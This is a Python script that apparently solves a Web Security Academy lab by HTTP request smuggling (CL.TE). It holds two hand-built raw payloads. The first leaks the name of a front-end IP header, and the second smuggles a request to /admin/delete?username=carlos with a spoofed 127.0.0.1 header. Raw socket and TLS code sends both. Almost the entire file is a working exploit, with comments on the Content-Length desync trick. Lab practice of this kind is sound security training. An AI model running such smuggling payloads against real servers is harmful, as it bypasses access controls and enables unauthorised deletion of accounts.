import socket
import ssl
import re

host = '0ac8001903c65ba48175616600af007b.web-security-academy.net'
port = 443

# Smuggling payload (CL.TE)
payload1 = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 124\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "POST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 200\r\n"
    "Connection: close\r\n"
    "\r\n"
    "search=test\r\n"
)
# body1 = (
#     "0\r\n"
#     "\r\n"
#     "POST / HTTP/1.1\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 200\r\n"
#     "Connection: close\r\n"
#     "\r\n"
#     "search=test"
# )
# print(len(body1))  # 124
# Content-Length: 200 (line 19) is fake CL to bypass the TE header

# Smuggling payload (CL.TE)
payload2 = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 166\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "X-VsAfaU-Ip: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 10\r\n"
    "Connection: close\r\n"
    "\r\n"
    "x=1\r\n"
)

# body2 = (
#     "0\r\n"
#     "\r\n"
#     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
#     "X-DrRdit-Ip: 127.0.0.1\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 10\r\n"
#     "Connection: close\r\n"
#     "\r\n"
#     "x=1"
# )
# print(len(body2))  # 166
# Content-Length: 10 (line 50) is fake CL to bypass the TE header

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

header_ip_regex = re.compile(r"^X-[\w\-]*[iI][pP]:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$")
def send_find_ip(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = b""
            while True:
                try:
                    part = ssock.recv(4096)
                    if not part:
                        break
                    response += part
                except:
                    break
            decoded = response.decode(errors="ignore")
            print("[+] Searching for IP headers of the form X-*-IP: x.x.x.x")
            for line in decoded.splitlines():
                if header_ip_regex.match(line.strip()):
                    print("[+] Found header:", line.strip())

# Send payload1 to find the X-Forwarded-For IP address
# and then send payload2 to delete the user "carlos"

import time
print("[+] Sending smuggling payload...")
send_find_ip(host, port, payload1) # X-VsAfaU-Ip: 14.177.103.193
time.sleep(15)
send_raw_https(host, port, payload2)